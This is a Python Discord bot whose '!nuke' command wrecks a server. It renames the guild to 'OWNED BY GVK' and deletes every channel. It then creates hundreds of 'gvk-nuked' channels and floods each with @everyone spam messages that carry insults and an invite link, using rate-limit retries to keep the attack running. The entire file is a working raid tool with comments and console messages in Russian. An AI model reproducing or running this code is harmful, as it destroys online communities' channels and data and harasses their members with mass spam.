import discord
from discord.ext import commands
import asyncio
import random

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    # 1. МЕНЯЕМ НАЗВАНИЕ
    try:
        await guild.edit(name="OWNED BY GVK")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    # 2. УДАЛЯЕМ КАНАЛЫ БЫСТРЕЕ (НО БЕЗ ВАРНИНГОВ)
    print("🗑️ БЫСТРОЕ удаление каналов...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    # Удаляем пачками по 3 канала параллельно
    async def delete_batch(batch):
        nonlocal deleted, skipped
        for channel in batch:
            try:
                await channel.delete()
                deleted += 1
                print(f"   ✅ Удален: #{channel.name}")
            except discord.Forbidden:
                print(f"   ⚠️ Нет прав: #{channel.name}")
                skipped += 1
            except discord.HTTPException as e:
                if "59074" in str(e):
                    print(f"   🛡️ Защищенный: #{channel.name}")
                    skipped += 1
                else:
                    print(f"   ❌ Ошибка: {e}")
                    skipped += 1
            except Exception as e:
                print(f"   ❌ Ошибка: #{channel.name} - {e}")
                skipped += 1
    
    # Разбиваем на пачки по 3
    batch_size = 3
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        await delete_batch(batch)
        print(f"   📦 Пачка {i//batch_size + 1} завершена")
        await asyncio.sleep(0.15)  # Маленькая пауза между пачками
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    # Короткая пауза
    await asyncio.sleep(1.5)
    
    # 3. БЫСТРОЕ СОЗДАНИЕ КАНАЛОВ (пачками по 5)
    print("🔥 БЫСТРОЕ создание каналов (5 сообщений)...")
    
    SPAM_TEXT = """@everyone
**ТРАХНУТЫ BY GVK**

https://discord.gg/sYvDS9mNst

# ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
"""
    
    created = 0
    failed = 0
    
    async def create_batch(batch_num, batch_size):
        nonlocal created, failed
        tasks = []
        
        for j in range(batch_size):
            i = batch_num * batch_size + j
            tasks.append(create_channel(i))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
    
    async def create_channel(i):
        try:
            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
            
            # Отправляем 5 сообщений максимально быстро
            for _ in range(5):
                await ch.send(SPAM_TEXT)
                await asyncio.sleep(0.02)  # Микро пауза
            
            print(f"✅ Канал #{i+1} создан (5 сообщений)")
            return True
            
        except discord.Forbidden:
            print(f"❌ Нет прав на канал {i+1}")
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                print(f"⚠️ Rate limit на канале {i+1}")
                await asyncio.sleep(0.5)
                return await create_channel(i)  # Повтор
            else:
                print(f"❌ Ошибка канала {i+1}: {e}")
                return False
        except Exception as e:
            print(f"❌ Ошибка {i+1}: {e}")
            return False
    
    # Создаем пачками по 5 каналов параллельно
    batch_size = 5
    max_batches = 100  # 500 каналов максимум
    
    for batch_num in range(max_batches):
        await create_batch(batch_num, batch_size)
        print(f"📦 Пакет {batch_num+1} завершен (создано {created})")
        
        # Пауза после пакета
        if (batch_num + 1) % 5 == 0:
            await asyncio.sleep(0.8)  # После каждых 5 пакетов
        else:
            await asyncio.sleep(0.3)  # Обычная пауза
        
        # Если создано много каналов, проверяем лимит
        if created >= 450:
            print("⚠️ Достигнут лимит каналов, останавливаюсь...")
            break
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок: {failed}")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано каналов: {created}\nСообщений: {created * 5}")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

import os
bot.run(os.environ['TOKEN'])
